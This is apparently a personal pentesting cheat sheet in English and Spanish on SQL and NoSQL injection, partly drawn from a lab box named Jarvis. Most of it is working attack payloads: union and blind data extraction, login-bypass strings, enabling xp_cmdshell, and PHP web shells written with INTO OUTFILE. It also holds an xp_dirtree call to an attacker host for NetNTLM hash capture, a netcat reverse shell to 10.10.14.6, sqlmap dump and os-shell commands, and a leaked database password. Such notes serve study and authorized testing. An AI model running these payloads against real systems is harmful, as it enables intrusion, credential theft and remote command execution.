---
title: SQL Injections
category: web
order: 1
---



# Intro
---

## Classes
* **INBOUND**  
      >   data is extracted using the same channel that is used to inject the SQL code.
* **OUT OF BAND**  
      >   data is retrieved using a different channel
* **INFERENTIAL**  
      >  there is no actual transfer of data, but the tester is able to reconstruct the information by sending particular requests and observing the resulting behaviour

## Types
* **Error-based**   
      > the webpage show us an error
* **Union-based**   
      > The SQL UNION is used to combine the results of two or more SELECT SQL statements into a single result.
* **Blind-sql-injection**   
      > check with time or different information showing

## methodology
1. Identify injection and Injection type (with strings  use ' with numbers  dont)
2. Attack Error based
3. Attack Union based
4. Attack Blind

# 1 Error based SQL
---
## case 1 MSSQL
```
http://[site]/page.asp?id=1 or 1=convert(int,(USER))--
```
* respuesta
```
Syntax error converting the nvarchar value 'nombre_de_usuario' to a column of data type int
```
Grab the database user with USER
Grab the database name with DB_NAME
Grab the servername with @@servername
Grab the Windows/OS version with @@version

## Case 2 MSSQL
https://www.exploit-db.com/papers/12975/

* Enumerate column and table name
```
http://www.example.com/page.asp?id=1' HAVING 1=1--
Error message: Column 'news.news_id' is invalid                 < table_name.column
```
```
http://www.example.com/page.asp?id=1' GROUP BY news.news_id HAVING 1=1--
Error message: Column 'news.news_author' is invalid           < table_name.column2
```
```
http://www.example.com/page.asp?id=1' GROUP BY news.news_id,news.news_author HAVING 1=1--
Error message: Column 'news.news_detail' is invalid             < table_name.column3
```
Until no error

* Enumerate version, db name, users:
```
http://www.example.com/page.asp?id=1+and+1=convert(int,@@version)--
http://www.example.com/page.asp?id=1+and+1=convert(int,db_name())--
http://www.example.com/page.asp?id=1+and+1=convert(int,user_name())--       << Is the user running as dbo or sa?
```
```
xp_cmdshell << if running as database admin
http://www.example.com/news.asp?id=1; exec master.dbo.xp_cmdshell 'command'
'; exec master.dbo.xp_cmdshell 'command'
```


On MSSQL 2005 you may need to reactivate xp_cmdshell first as it's disabled by default:
```
EXEC sp_configure 'show advanced options', 1;--
RECONFIGURE;--
EXEC sp_configure 'xp_cmdshell', 1;--
RECONFIGURE;--  
```
On MSSQL 2000:
```
EXEC sp_addextendedproc 'xp_anyname', 'xp_log70.dll';--
```



# 2  Union based SQLI
---

## case 1 MSSQL
ejemplo :192.168.30.35/comment.php?id=437

```
?id=738 order by 1
?id=738 order by 2
?id=738 order by n
hasta que aparece un error " unkown column 7 in order clause"
```

ej 2
```
?id=738 union select 1,2,3,4,5,6
```
ej 3
```
?id=-1 union select 1,2,3,4,@@version,6
?id=-1 union select 1,2,3,4,user(),6
```
ej 4
```
?id=-1 union select 1,2,3,4,table_name,6 FROM information_schema tables
```
then
```
?id=-1 union all select 1,2,3,4,column_name,6 FROM information_schema columns where table_name='users'
esto nos devuelve que hay 4 columnas, id name password y country
```
then
```
id=-1 union select 1,2,name,4,password,6 FROM users
```
esto se sluciona deshabilitando error reporting (video 94)

## case 2 MySQL
* enumerate columns
```
http://[site]/page.php?id=1 order by 1/*
http://[site]/page.php?id=1 order by 2/*
http://[site]/page.php?id=1 order by 5/*
5 gives a valid page
```
* union  
```
http://[site]/page.php?id=1 union all select 1,2,3,4,5/
gives a valid page
```
Change the first part of the query to a null or negative value so we can see
```
http://[site]/page.php?id=-1 union all select 1,2,3,4,5/*
prints only 2 and 3
```
* grab info
```
http://[site]/page.php?id=null union all select 1,user(),3,4,5/*
http://[site]/page.php?id=null union all select 1,2,database(),4,5/*
http://[site]/page.php?id=null union all select 1,@@version,@@datadir,4,5/*
```



# 3 Blind SQLi
---
## case 1 MSSQL
```
http://[site]/page.asp?id=1; IF (LEN(USER)=1) WAITFOR DELAY '00:00:10'--
http://[site]/page.asp?id=1; IF (LEN(USER)=2) WAITFOR DELAY '00:00:10'--
http://[site]/page.asp?id=1; IF (LEN(USER)=3) WAITFOR DELAY '00:00:10'--
...
etc until we wait for 10 secs
```
* to extract the user name:
```
http://[site]/page.asp?id=1; IF (ASCII(lower(substring((USER),1,1)))>97) WAITFOR DELAY '00:00:10'--
http://[site]/page.asp?id=1; IF (ASCII(lower(substring((USER),1,1)))>98) WAITFOR DELAY '00:00:10'--
http://[site]/page.asp?id=1; IF (ASCII(lower(substring((USER),1,1)))=100) WAITFOR DELAY '00:00:10'--
hangs for 10 seconds
http://[site]/page.asp?id=1; IF (ASCII(lower(substring((USER),2,1)))>97) WAITFOR DELAY '00:00:10'--
http://[site]/page.asp?id=1; IF (ASCII(lower(substring((USER),2,1)))=98) WAITFOR DELAY '00:00:10'-- (+10 seconds)
hangs for 10 seconds
```
and so on



podemos probar
```
id=738-sleep(5)  <-si vemos que tarda es por que el input es injectable
select IF(MID(@@version,1,1) = '5',SLEEP(5),0)
```

tmb podemos probar con un and para ver si trae o no resultados
```
id=6 and 1=1
id=6 and 1=2
```
SUPONEMOs que es injectable y buscamos un archivo con load_file
```
id=738 union all select 1,2,3,4,load_file("c:/windows/system32/drivers/etc/hosts"),6
```
Creamos un php
```
id=738 union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd'];?>",6 into OUTFILE'c:/xampp/htdocs/backdoor.php'
```

With blind SQL injection vulnerabilities, many techniques such as UNION attacks are not effective

## Exploiting blind SQL injection by triggering conditional responses

Consider an application that uses tracking cookies to gather analytics about usage. Requests to the application include a cookie header like this:

Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4

When a request containing a TrackingId cookie is processed, the application determines whether this is a known user using an SQL query like this:
```
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
```
This query is vulnerable to SQL injection, but the results from the query are not returned to the user. However, the application does behave differently depending on whether the query returns any data. If it returns data (because a recognized TrackingId was submitted), then a "Welcome back" message is displayed within the page.
```
xyz' UNION SELECT 'a' WHERE 1=1-- << shows welcome back
xyz' UNION SELECT 'a' WHERE 1=2--  << shows nothing
```
try to gues the password for Administrator:
```
xyz' UNION SELECT 'a' FROM Users WHERE Username = 'Administrator' and SUBSTRING(Password, 1, 1) > 'm'--
xyz' UNION SELECT 'a' FROM Users WHERE Username = 'Administrator' and SUBSTRING(Password, 1, 1) > 't'--
```
We can continue this process to systematically determine the full password for the Administrator user.


## Inducing conditional responses by triggering SQL errors
To see how this works, suppose that two requests are sent containing the following TrackingId cookie values in turn:
```
xyz' UNION SELECT CASE WHEN (1=2) THEN 1/0 ELSE NULL END--
xyz' UNION SELECT CASE WHEN (1=1) THEN 1/0 ELSE NULL END--
```
These inputs use the CASE keyword to test a condition and return a different expression depending on whether the expression is true. With the first input, the case expression evaluates to NULL, which does not cause any error. With the second input, it evaluates to 1/0, which causes a divide-by-zero error. Assuming the error causes some difference in the application's HTTP response, we can use this difference to infer whether the injected condition is true.

Using this technique, we can retrieve data in the way already described, by systematically testing one character at a time:
```
xyz' union select case when (username = 'Administrator' and SUBSTRING(password, 1, 1) > 'm') then 1/0 else null end from users—
```
## Exploiting blind SQL injection by triggering time delays
```
'; IF (1=2) WAITFOR DELAY '0:0:10'--
'; IF (1=1) WAITFOR DELAY '0:0:10'--
```
* attack
```
'; IF (SELECT COUNT(username) FROM Users WHERE username = 'Administrator' AND SUBSTRING(password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'—
```



# mssql Capture and crack NetNTLM hash
---
the MSSQL Server service account can be made to initiate a remote
SMB connection using the command below.
```
'+EXEC+master.sys.xp_dirtree+'\\10.10.14.9\share--
```

si corremos responder en 10.10.14.9 vamos a pegar hashes

# SQL filter bypass
---
Beyond SQLi: Obfuscate and Bypass - https://www.exploit-db.com/papers/17934/

AND, OR operators
AND = &&
OR = ||

Comment operator << Mysql

```
--  	
#  
/**/  
```





### Retrieving multiple values within a single column STRING CONCATENATION
In the preceding example, suppose instead that the query only returns a single column.

You can easily retrieve multiple values together within this single column by concatenating the values together, ideally including a suitable separator to let you distinguish the combined values. For example, on Oracle you could submit the input:

```
' UNION SELECT username || '~' || password FROM users--
```
This uses the double-pipe sequence || which is a string concatenation operator on Oracle. The injected query concatenates together the values of the username and password fields, separated by the ~ character.

## Examining the database in SQL injection attacks


### ORACLE
On Oracle, you can obtain the same information with slightly different queries.

You can list tables by querying all_tables:

SELECT * FROM all_tables

And you can list columns by querying all_tab_columns:

SELECT * FROM all_tab_columns WHERE table_name = 'USERS'




# JARVIS CASE BLIND SQLI
---

## identifing
la detectamos con:
```
http://jarvis.htb/room.php?cod=6 and 1=1
http://jarvis.htb/room.php?cod=6 and 1=2
```
## enumeration
```
jarvis.htb/room.php?cod=6 order by 1
jarvis.htb/room.php?cod=6 order by 7
jarvis.htb/room.php?cod=6 order by 8 > error
```
* chequeamos que tipos estan permitidos

```
/room.php?cod=6 UNION SELECT 'a','a','a','a','a','a','a'
/room.php?cod=6 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL
jarvis.htb/room.php?cod=6 UNION SELECT 1,2,3,4,5,6,7
```
* show results
usamos -1 para que nos muestre los numeros en otro lado
```
jarvis.htb/room.php?cod=-1 UNION SELECT 1,2,3,4,5,6,7
```
nos muestra 2,3,4,5

* probamos ver la version en alguno de los campos imprimibles
```
jarvis.htb/room.php?cod=-1 UNION SELECT 1,@@verion,3,4,5,6,7
```

* seguimos enumerando

* user, hostname , db  

```
http://jarvis.htb/room.php?cod=-1%20UNION%20SELECT%20NULL,@@version,user(),@@hostname,5,6,7

user = DBadmin@localhost
hostname = jarvis
database() = HOTEL
```

* schema

```
jarvis.htb/room.php?cod=-1 UNION SELECT 1,(select SCHEMA_NAME from Information_Schema.SCHEMATA LIMIT3,1),3,4,5,6,7
```

* lfi

```
http://jarvis.htb/room.php?cod=-1%20UNION%20SELECT%20NULL,@@version,LOAD_FILE(%22/etc/passwd%22),4,5,NULL,NULL

daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
_apt:x:104:65534::/nonexistent:/bin/false
messagebus:x:105:110::/var/run/dbus:/bin/false
pepper:x:1000:1000:,,,:/home/pepper:/bin/bash
mysql:x:106:112:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:107:65534::/run/sshd:/usr/sbin/nologin

```
* lfi 2

```
/var/www/html/index.php

<?php
          error_reporting(0);
          include("connection.php");
          include("roomobj.php");
          $result=$connection->query("select * from room");
          while($line=mysqli_fetch_array($result)){
            $room=new Room();
            $room->cod=$line['cod'];
            $room->name=$line['name'];
            $room->price=$line['price'];
            $room->star=$line['star'];
            $room->image=$line['image'];
            $room->mini=$line['mini'];

            $room->printRoom();
            }
          ?>
```
*  LFI 3

```
/var/www/html/connection.php

$connection=new mysqli('127.0.0.1','DBadmin','imissyou','hotel');

```
* Reverse shell

```
la creamos

/room.php?cod=-1 UNION SELECT NULL,1,1,4,"<?php system($_GET[\"cmd\"]); ?>",NULL,NULL into OUTFILE"/var/www/html/shell3.php"
```
```
la iniciamos

/shell3.php?cmd=nc -nv 10.10.14.6 4444 -e /bin/bash
```

# second order sqli
---

registramos cuentas con un sqli por ejemplo

```
rop' or 2=2 #
' or 0=0 ​ --
' or 0=0 #
' or 0=0 #"
' or '1'='1'​ --
' or 1 ​ --'
' or 1=1​ --
' or 1=1 or ''='
' or 1=1 or ""=
' or a=a​ --
' or a=a
') or ('a'='a
'hi' or 'x'='x';
```

despues nos logueamos
rop' or 2=2 #:password


# Login Bypass:
---
replace ' with " if fail
```
' or '1'='1  
' or 1=1;--  
' or 1=1;#  
') or ('x'='x  
' or <column> like '%';--  
' or 1=1 LIMIT 1;--  

USERNAME:   ' or 1/*  
PASSWORD:   */ =1 --  

USERNAME: admin' or 'a'='a  
PASSWORD '#  

USERNAME: admin' --  
PASSWORD:
```


# inject webshell
---
```
Mysql
'*'   
'&'  
'^'  
'-'  
' or true;--   
' or 1;--  

union all select "<?php echo shell_exec($_GET['cmd']);?>",2,3,4,5,6 into OUTFILE '/var/www/html/shell.php'
```


# NoSql
---

## like sql
```
select * from usernames where user='$user';

$user->findone(array(
"username"=> "$user"
));
```

```
usuarios que no son iguales ''
user->findone(array(
"username"=> "{$ne:''}"
));

```

## injection  php
url check if user exist
```
username[$ne]=RandomNoexiste&password[$ne]=noexiste
```

## injection with regex  php
```
check for 1 char and 4 char usernames
username[$regex]=^.{1}&password=noexist
username[$regex]=^.{4}&password=noexist
```

## node.js
1. change Content-type application/json
2. convert payload to json


```
{
"username": { "$ne": "RandomNOExiste"},
"passowrd": { "$ne": "ipssec"},
"login":"login"
}

```


# Automated sql injection tools [sqlmap]
---
buscar vulnerabilidades

```
root@kali: sqlmap -u http:192.168.30.35 --crawl=1
```
Sacando data
```
root@kali:sqlmap -u http://192.168.30.35/comment.php?id=839 --dbms=mysql --dump --threads=5
```

otros argumentos:

```
--os-shell: automatic code execution: os-shel> ipconfig ->succes
```

# RESOURCES
---
https://linuxhint.com/blind_sql_injection_tutorial/
